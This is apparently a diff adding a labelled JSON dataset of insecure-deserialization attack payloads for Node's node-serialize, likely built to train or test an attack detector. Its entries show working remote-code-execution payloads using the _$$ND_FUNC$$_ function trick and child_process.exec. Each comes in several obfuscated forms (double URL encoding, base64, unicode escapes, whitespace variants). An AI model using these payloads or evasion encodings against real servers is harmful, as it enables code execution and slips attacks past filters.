@@ -1,0 +1,3748 @@
+[
+  {
+    "id": "raw_deser_00001__obf01",
+    "payload": "var%2520y%2520%253D%2520%257B%250A%2520%2520%2520%2520rce%2520%253A%2520function%2528%2529%257Brequire%2528%2527child_process%2527%2529.exec%2528%2527ls%2520%252F%2527%252C%2520function%2528error%252Cstdout%252C%2520stderr%2529%2520%257B%2520console.log%2528stdout%2529%2520%257D%2529%253B%257D%252C%250A%257D%250Avar%2520serialize%2520%253D%2520require%2528%2527node-serialize%2527%2529%253B%250Aconsole.log%2528%2522Serialized%253A%2520%255Cn%2522%2520%252B%2520serialize.serialize%2528y%2529%2529%253B",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Files/node-serialize.js",
+    "source_path": "Insecure Deserialization/Files/node-serialize.js",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c8e6799867ca98dab29e25129e419763a5ce8a9d37d9df8df43e44696f859fc8",
+    "original_id": "raw_deser_00001",
+    "original_payload": "var y = {\n    rce : function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });},\n}\nvar serialize = require('node-serialize');\nconsole.log(\"Serialized: \\n\" + serialize.serialize(y));",
+    "obfuscated_payload": "var%2520y%2520%253D%2520%257B%250A%2520%2520%2520%2520rce%2520%253A%2520function%2528%2529%257Brequire%2528%2527child_process%2527%2529.exec%2528%2527ls%2520%252F%2527%252C%2520function%2528error%252Cstdout%252C%2520stderr%2529%2520%257B%2520console.log%2528stdout%2529%2520%257D%2529%253B%257D%252C%250A%257D%250Avar%2520serialize%2520%253D%2520require%2528%2527node-serialize%2527%2529%253B%250Aconsole.log%2528%2522Serialized%253A%2520%255Cn%2522%2520%252B%2520serialize.serialize%2528y%2529%2529%253B",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 47762545,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00001__obf02",
+    "payload": "dmFyIHkgPSB7CiAgICByY2UgOiBmdW5jdGlvbigpe3JlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdscyAvJywgZnVuY3Rpb24oZXJyb3Isc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTt9LAp9CnZhciBzZXJpYWxpemUgPSByZXF1aXJlKCdub2RlLXNlcmlhbGl6ZScpOwpjb25zb2xlLmxvZygiU2VyaWFsaXplZDogXG4iICsgc2VyaWFsaXplLnNlcmlhbGl6ZSh5KSk7",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Files/node-serialize.js",
+    "source_path": "Insecure Deserialization/Files/node-serialize.js",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c8e6799867ca98dab29e25129e419763a5ce8a9d37d9df8df43e44696f859fc8",
+    "original_id": "raw_deser_00001",
+    "original_payload": "var y = {\n    rce : function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });},\n}\nvar serialize = require('node-serialize');\nconsole.log(\"Serialized: \\n\" + serialize.serialize(y));",
+    "obfuscated_payload": "dmFyIHkgPSB7CiAgICByY2UgOiBmdW5jdGlvbigpe3JlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdscyAvJywgZnVuY3Rpb24oZXJyb3Isc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTt9LAp9CnZhciBzZXJpYWxpemUgPSByZXF1aXJlKCdub2RlLXNlcmlhbGl6ZScpOwpjb25zb2xlLmxvZygiU2VyaWFsaXplZDogXG4iICsgc2VyaWFsaXplLnNlcmlhbGl6ZSh5KSk7",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 47763554,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00001__obf03",
+    "payload": "var y \\u003d {\n    rce \\u003a function\\u0028){require\\u0028\\u0027child_process\\u0027).exec(\\u0027ls /\\u0027, function\\u0028error,stdout, stderr\\u0029 \\u007b console.log\\u0028stdout) }\\u0029;\\u007d,\n\\u007d\nvar serialize = require('node-serialize');\nconsole.log(\"Serialized: \\u005cn\" + serialize.serialize\\u0028y\\u0029\\u0029\\u003b",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Files/node-serialize.js",
+    "source_path": "Insecure Deserialization/Files/node-serialize.js",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c8e6799867ca98dab29e25129e419763a5ce8a9d37d9df8df43e44696f859fc8",
+    "original_id": "raw_deser_00001",
+    "original_payload": "var y = {\n    rce : function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });},\n}\nvar serialize = require('node-serialize');\nconsole.log(\"Serialized: \\n\" + serialize.serialize(y));",
+    "obfuscated_payload": "var y \\u003d {\n    rce \\u003a function\\u0028){require\\u0028\\u0027child_process\\u0027).exec(\\u0027ls /\\u0027, function\\u0028error,stdout, stderr\\u0029 \\u007b console.log\\u0028stdout) }\\u0029;\\u007d,\n\\u007d\nvar serialize = require('node-serialize');\nconsole.log(\"Serialized: \\u005cn\" + serialize.serialize\\u0028y\\u0029\\u0029\\u003b",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 47764563,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00001__obf04",
+    "payload": "var%2509y%250A%3D%250A%7B%0A%250Arce%2509%3A%250Afunction%28%29%7Brequire%28%27child_process%27%29.exec%28%27ls%2509%2F%27%2C%250Afunction%28error%2Cstdout%2C%250Astderr%29%250A%7B%2Bconsole.log%28stdout%29%2509%7D%29%3B%7D%2C%0A%7D%0Avar%2Bserialize%250A%3D%2509require%28%27node-serialize%27%29%3B%0Aconsole.log%28%22Serialized%3A%250A%5Cn%22%250A%2B%250Aserialize.serialize%28y%29%29%3B",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Files/node-serialize.js",
+    "source_path": "Insecure Deserialization/Files/node-serialize.js",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c8e6799867ca98dab29e25129e419763a5ce8a9d37d9df8df43e44696f859fc8",
+    "original_id": "raw_deser_00001",
+    "original_payload": "var y = {\n    rce : function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });},\n}\nvar serialize = require('node-serialize');\nconsole.log(\"Serialized: \\n\" + serialize.serialize(y));",
+    "obfuscated_payload": "var%2509y%250A%3D%250A%7B%0A%250Arce%2509%3A%250Afunction%28%29%7Brequire%28%27child_process%27%29.exec%28%27ls%2509%2F%27%2C%250Afunction%28error%2Cstdout%2C%250Astderr%29%250A%7B%2Bconsole.log%28stdout%29%2509%7D%29%3B%7D%2C%0A%7D%0Avar%2Bserialize%250A%3D%2509require%28%27node-serialize%27%29%3B%0Aconsole.log%28%22Serialized%3A%250A%5Cn%22%250A%2B%250Aserialize.serialize%28y%29%29%3B",
+    "obfuscation_chain": [
+      "whitespace_variant",
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 47765572,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00002__obf01",
+    "payload": "var ser%69alize = requ%69re('node-seri%61lize');",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Files/node-serialize.js",
+    "source_path": "Insecure Deserialization/Files/node-serialize.js",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "866bb55c812df5dd03ea4a982033d6fdce8e79f220b26fda61da07f1d70c8b6a",
+    "original_id": "raw_deser_00002",
+    "original_payload": "var serialize = require('node-serialize');",
+    "obfuscated_payload": "var ser%69alize = requ%69re('node-seri%61lize');",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 47862548,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00002__obf02",
+    "payload": "dmFyIHNlcmlhbGl6ZSA9IHJlcXVpcmUoJ25vZGUtc2VyaWFsaXplJyk7",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Files/node-serialize.js",
+    "source_path": "Insecure Deserialization/Files/node-serialize.js",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "866bb55c812df5dd03ea4a982033d6fdce8e79f220b26fda61da07f1d70c8b6a",
+    "original_id": "raw_deser_00002",
+    "original_payload": "var serialize = require('node-serialize');",
+    "obfuscated_payload": "dmFyIHNlcmlhbGl6ZSA9IHJlcXVpcmUoJ25vZGUtc2VyaWFsaXplJyk7",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 47863557,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00002__obf03",
+    "payload": "var%09serialize%0A=%09require('node-serialize');",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Files/node-serialize.js",
+    "source_path": "Insecure Deserialization/Files/node-serialize.js",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "866bb55c812df5dd03ea4a982033d6fdce8e79f220b26fda61da07f1d70c8b6a",
+    "original_id": "raw_deser_00002",
+    "original_payload": "var serialize = require('node-serialize');",
+    "obfuscated_payload": "var%09serialize%0A=%09require('node-serialize');",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 47864566,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_deser_00002__obf04",
+    "payload": "var%2520serialize%2520%253D%2520require%2528%2527node-serialize%2527%2529%253B",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Files/node-serialize.js",
+    "source_path": "Insecure Deserialization/Files/node-serialize.js",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "866bb55c812df5dd03ea4a982033d6fdce8e79f220b26fda61da07f1d70c8b6a",
+    "original_id": "raw_deser_00002",
+    "original_payload": "var serialize = require('node-serialize');",
+    "obfuscated_payload": "var%2520serialize%2520%253D%2520require%2528%2527node-serialize%2527%2529%253B",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 47865575,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00003__obf01",
+    "payload": "var %79 = {\n        r%63e : func%74ion(){\n            requir%65('ch%69ld_proc%65s%73').e%78ec('ls /', f%75nct%69on(error,\n            stdout, stderr) { cons%6Fle.log(s%74d%6Fu%74) });\n        },\n    }\n    var seriali%7Ae = requir%65('node-ser%69al%69ze');\n    co%6E%73ole.lo%67(\"Se%72ialized: \\n\" + seriali%7Ae.serial%69ze(y));",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "f4ecc9219d6264a1f14882f9aefe6555d9434d4cebac8bd6384b402f18ca1e9e",
+    "original_id": "raw_deser_00003",
+    "original_payload": "var y = {\n        rce : function(){\n            require('child_process').exec('ls /', function(error,\n            stdout, stderr) { console.log(stdout) });\n        },\n    }\n    var serialize = require('node-serialize');\n    console.log(\"Serialized: \\n\" + serialize.serialize(y));",
+    "obfuscated_payload": "var %79 = {\n        r%63e : func%74ion(){\n            requir%65('ch%69ld_proc%65s%73').e%78ec('ls /', f%75nct%69on(error,\n            stdout, stderr) { cons%6Fle.log(s%74d%6Fu%74) });\n        },\n    }\n    var seriali%7Ae = requir%65('node-ser%69al%69ze');\n    co%6E%73ole.lo%67(\"Se%72ialized: \\n\" + seriali%7Ae.serial%69ze(y));",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 47962551,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00003__obf02",
+    "payload": "dmFyIHkgPSB7CiAgICAgICAgcmNlIDogZnVuY3Rpb24oKXsKICAgICAgICAgICAgcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2xzIC8nLCBmdW5jdGlvbihlcnJvciwKICAgICAgICAgICAgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTsKICAgICAgICB9LAogICAgfQogICAgdmFyIHNlcmlhbGl6ZSA9IHJlcXVpcmUoJ25vZGUtc2VyaWFsaXplJyk7CiAgICBjb25zb2xlLmxvZygiU2VyaWFsaXplZDogXG4iICsgc2VyaWFsaXplLnNlcmlhbGl6ZSh5KSk7",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "f4ecc9219d6264a1f14882f9aefe6555d9434d4cebac8bd6384b402f18ca1e9e",
+    "original_id": "raw_deser_00003",
+    "original_payload": "var y = {\n        rce : function(){\n            require('child_process').exec('ls /', function(error,\n            stdout, stderr) { console.log(stdout) });\n        },\n    }\n    var serialize = require('node-serialize');\n    console.log(\"Serialized: \\n\" + serialize.serialize(y));",
+    "obfuscated_payload": "dmFyIHkgPSB7CiAgICAgICAgcmNlIDogZnVuY3Rpb24oKXsKICAgICAgICAgICAgcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2xzIC8nLCBmdW5jdGlvbihlcnJvciwKICAgICAgICAgICAgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTsKICAgICAgICB9LAogICAgfQogICAgdmFyIHNlcmlhbGl6ZSA9IHJlcXVpcmUoJ25vZGUtc2VyaWFsaXplJyk7CiAgICBjb25zb2xlLmxvZygiU2VyaWFsaXplZDogXG4iICsgc2VyaWFsaXplLnNlcmlhbGl6ZSh5KSk7",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 47963560,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00003__obf03",
+    "payload": "var y = {\n        rce : function(\\u0029\\u007b\n            require\\u0028'child_process').exec(\\u0027ls \\u002f', function\\u0028error,\n            stdout, stderr\\u0029 \\u007b console.log(stdout\\u0029 }\\u0029\\u003b\n        },\n    \\u007d\n    var serialize \\u003d require(\\u0027node-serialize\\u0027)\\u003b\n    console.log(\"Serialized\\u003a \\u005cn\\u0022 + serialize.serialize\\u0028y)\\u0029;",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "f4ecc9219d6264a1f14882f9aefe6555d9434d4cebac8bd6384b402f18ca1e9e",
+    "original_id": "raw_deser_00003",
+    "original_payload": "var y = {\n        rce : function(){\n            require('child_process').exec('ls /', function(error,\n            stdout, stderr) { console.log(stdout) });\n        },\n    }\n    var serialize = require('node-serialize');\n    console.log(\"Serialized: \\n\" + serialize.serialize(y));",
+    "obfuscated_payload": "var y = {\n        rce : function(\\u0029\\u007b\n            require\\u0028'child_process').exec(\\u0027ls \\u002f', function\\u0028error,\n            stdout, stderr\\u0029 \\u007b console.log(stdout\\u0029 }\\u0029\\u003b\n        },\n    \\u007d\n    var serialize \\u003d require(\\u0027node-serialize\\u0027)\\u003b\n    console.log(\"Serialized\\u003a \\u005cn\\u0022 + serialize.serialize\\u0028y)\\u0029;",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 47964569,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00003__obf04",
+    "payload": "var%20y %3D%20%7B%0A  %20%20  %20 rce %3A%20function%28%29{%0A  %20  %20%20%20 %20%20 require%28'child_process'%29.exec%28%27ls %2F%27%2C%20function%28error%2C\n%20%20%20%20   %20  %20%20stdout%2C%20stderr%29%20%7B console.log%28stdout)%20}%29;\n%20%20 %20%20%20%20 %7D%2C%0A%20%20  %7D%0A %20 %20var serialize =%20require(%27node-serialize')%3B\n%20%20%20%20console.log%28\"Serialized:%20%5Cn\"%20%2B%20serialize.serialize(y))%3B",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "f4ecc9219d6264a1f14882f9aefe6555d9434d4cebac8bd6384b402f18ca1e9e",
+    "original_id": "raw_deser_00003",
+    "original_payload": "var y = {\n        rce : function(){\n            require('child_process').exec('ls /', function(error,\n            stdout, stderr) { console.log(stdout) });\n        },\n    }\n    var serialize = require('node-serialize');\n    console.log(\"Serialized: \\n\" + serialize.serialize(y));",
+    "obfuscated_payload": "var%20y %3D%20%7B%0A  %20%20  %20 rce %3A%20function%28%29{%0A  %20  %20%20%20 %20%20 require%28'child_process'%29.exec%28%27ls %2F%27%2C%20function%28error%2C\n%20%20%20%20   %20  %20%20stdout%2C%20stderr%29%20%7B console.log%28stdout)%20}%29;\n%20%20 %20%20%20%20 %7D%2C%0A%20%20  %7D%0A %20 %20var serialize =%20require(%27node-serialize')%3B\n%20%20%20%20console.log%28\"Serialized:%20%5Cn\"%20%2B%20serialize.serialize(y))%3B",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 47965578,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00004__obf01",
+    "payload": "%7B%22rce%22%3A%22_%24%24ND_FUNC%24%24_function%28%29%7Brequire%28'child_process%27).exec%28%27ls%20%2F%27, function%28error,stdout,%20stderr)%20%7B%20console.log%28stdout)%20}%29%3B%7D%28%29\"}",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "df0df71d00dd3fc57912c1643b8a7042dd899e7ff2b9732320935a2a73167ffd",
+    "original_id": "raw_deser_00004",
+    "original_payload": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()\"}",
+    "obfuscated_payload": "%7B%22rce%22%3A%22_%24%24ND_FUNC%24%24_function%28%29%7Brequire%28'child_process%27).exec%28%27ls%20%2F%27, function%28error,stdout,%20stderr)%20%7B%20console.log%28stdout)%20}%29%3B%7D%28%29\"}",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 48062554,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00004__obf02",
+    "payload": "eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnbHMgLycsIGZ1bmN0aW9uKGVycm9yLHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7fSgpIn0=",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "df0df71d00dd3fc57912c1643b8a7042dd899e7ff2b9732320935a2a73167ffd",
+    "original_id": "raw_deser_00004",
+    "original_payload": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()\"}",
+    "obfuscated_payload": "eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnbHMgLycsIGZ1bmN0aW9uKGVycm9yLHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7fSgpIn0=",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 48063563,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00004__obf03",
+    "payload": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls+/',+function(error,stdout,%0Astderr)%0A{+console.log(stdout)%0A});}()\"}",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "df0df71d00dd3fc57912c1643b8a7042dd899e7ff2b9732320935a2a73167ffd",
+    "original_id": "raw_deser_00004",
+    "original_payload": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()\"}",
+    "obfuscated_payload": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls+/',+function(error,stdout,%0Astderr)%0A{+console.log(stdout)%0A});}()\"}",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 48064572,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_deser_00004__obf04",
+    "payload": "%257B%2522rce%2522%253A%2522_%2524%2524ND_FUNC%2524%2524_function%2528%2529%257Brequire%2528%2527child_process%2527%2529.exec%2528%2527ls%252B%252F%2527%252C%252Bfunction%2528error%252Cstdout%252C%252Bstderr%2529%25250A%257B%252509console.log%2528stdout%2529%25250A%257D%2529%253B%257D%2528%2529%2522%257D",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "df0df71d00dd3fc57912c1643b8a7042dd899e7ff2b9732320935a2a73167ffd",
+    "original_id": "raw_deser_00004",
+    "original_payload": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()\"}",
+    "obfuscated_payload": "%257B%2522rce%2522%253A%2522_%2524%2524ND_FUNC%2524%2524_function%2528%2529%257Brequire%2528%2527child_process%2527%2529.exec%2528%2527ls%252B%252F%2527%252C%252Bfunction%2528error%252Cstdout%252C%252Bstderr%2529%25250A%257B%252509console.log%2528stdout%2529%25250A%257D%2529%253B%257D%2528%2529%2522%257D",
+    "obfuscation_chain": [
+      "whitespace_variant",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 48065581,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00005__obf01",
+    "payload": "%6Eode-serialize",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "dd0d52d3eb5dfe7035764c71069c7feb4413fe21ced164ecf8f4d61de1fe6cd5",
+    "original_id": "raw_deser_00005",
+    "original_payload": "node-serialize",
+    "obfuscated_payload": "%6Eode-serialize",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 48162557,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00005__obf02",
+    "payload": "bm9kZS1zZXJpYWxpemU=",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Node.md",
+    "source_path": "Insecure Deserialization/Node.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "dd0d52d3eb5dfe7035764c71069c7feb4413fe21ced164ecf8f4d61de1fe6cd5",
+    "original_id": "raw_deser_00005",
